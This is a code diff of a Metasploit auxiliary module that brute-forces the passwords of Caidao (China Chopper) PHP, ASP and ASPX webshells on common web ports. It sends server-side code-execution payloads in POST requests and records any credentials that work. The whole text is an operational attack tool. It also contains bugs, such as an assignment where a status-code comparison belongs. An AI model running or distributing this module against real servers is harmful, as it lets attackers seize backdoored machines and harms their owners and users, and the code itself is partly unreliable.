@@ -4,15 +4,16 @@
 ##
 
 require 'msf/core'
-require 'pry'
 
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
-  def initialize
-    super(
+  def initialize(info = {})
+    super(update_info(info,
       'Name'           => 'Chinese Caidao Backdoor Bruteforce',
       'Description'    => 'This module attempts to brute chinese caidao php/asp/aspx backdoor.',
       'Author'         => [ 'Nixawk' ],
@@ -21,27 +22,15 @@ class Metasploit3 < Msf::Auxiliary
               [ 'URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
         ],
       'License'        => MSF_LICENSE,  
-    )
+    ))
 
     register_options(
       [
-        OptPath.new('PASS_FILE', 
-                    [ true, 
-                      "File containing passwords, one per line", 
-                      File.join(Msf::Config.data_directory, 'wordlists', 'CN_backdoor_passwords.txt') 
-                    ]
-                   ),
         OptString.new('TARGETURI', 
                       [ true, 
                         "The URI to authenticate against", 
                         "/backdoor.php" ]
                      ),
-        OptEnum.new('HTTP_METHOD', 
-                    [ true, 
-                      "HTTP Methods for bruteforce, only POST", 
-                      "POST",
-                     ["POST"]]
-                   ),
         OptEnum.new('TYPE',
                    [ true,
                       "backdoor type",
@@ -52,73 +41,67 @@ class Metasploit3 < Msf::Auxiliary
     register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
   end
 
-  def backdoor_brute(method, uri, wdl, payload, regexp)
-
-    File.open(wdl).each_line do |password|
-        password = password.chomp
-
-        puts "#{peer}: #{method} #{uri} password : #{password}"
-
-        res = send_request_cgi({
-          'method'    => "#{method}",
-          'uri'       => "#{uri}",
-          'data'      => "#{password}=#{payload}"
-        })
-
-        unless res
-          print_status("#{peer}: connection timed out")
-          return
-        end
-
-        unless res.body
-          print_status("#{peer}: no body here")
-          return
-        end
-
-        if res.code = 200 and regexp.match(res.body)
-          print_good("#{rhost}:#{rport} - [password: #{password}]\n")
-          return "#{password}"
-        end
+  def backdoor_brute(uri, user, pass, payload, regexp)
+    begin
+      res = send_request_cgi({
+          'uri'          =>  uri,
+          'method'       =>  "POST",
+          'vars_post'    =>  {
+            'user'   => user,
+            pass   => payload
+           }
+      })
+    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEOUT
+      print_error("#{peer} - Service failed to respond")
+      return :abort
     end
+
+    if res.code = 200 and regexp.match(res.body)
+      print_good("#{peer} - Successful login: password - \"#{pass}\"")
+      report_auth_info({
+        :host        => rhost,
+        :port        => rport,
+        :sname       => (ssl ? 'https': 'http'),
+        :user        => user,
+        :pass        => pass
+      })
+
+      return :next_user
+    end
+
+    return
   end
 
   def run_host(ip)
-    method = datastore['HTTP_METHOD']
-
     uri = normalize_uri(target_uri.path)
-    wdl = datastore['PASS_FILE']
     typ = datastore['TYPE']
 
-    payload = ""
-    regexp = ""
+    payload = nil
+    regexp = /woo5woo/mi
 
     case typ
     when /php$/mi
-      print_status('crack php backdoor')
+      print_status("#{peer} - Trying to crack php backdoor")
 
-      payload = "phpinfo();"
-      regexp = /<title>phpinfo\(\)<\/title>/mi
+      payload = '$_="5";echo "woo".$_."woo";'
 
     when /asp$/mi
-      print_status('crack asp backdoor')
+      print_status("#{peer} - Trying to crack asp backdoor")
 
       payload = 'execute("response.write(""woo""):response.write(Len(""admin"")):response.write(""woo""):response.end")'
-      regexp = /woo5woo/mi
 
     when /aspx$/mi
-      print_status('crack aspx backdoor')
+      print_status("#{peer} - Trying to crack aspx backdoor")
 
       payload = 'Response.Write("woo");Response.Write(1+4);Response.Write("woo")'
-      regexp = /woo5woo/mi
 
     else
-      print_error('no support')  
+      print_error("#{peer} - Backddor type is not support")  
     end
 
-    backdoor_brute(method,
-                   uri,
-                   wdl,
-                   payload,
-                   regexp)
+    each_user_pass { |user, pass|
+      print_status("#{peer} - Trying \"#{uri}\" : \"#{pass}\"")
+      backdoor_brute(uri, user, pass, payload, regexp)
+    }
   end
 end  
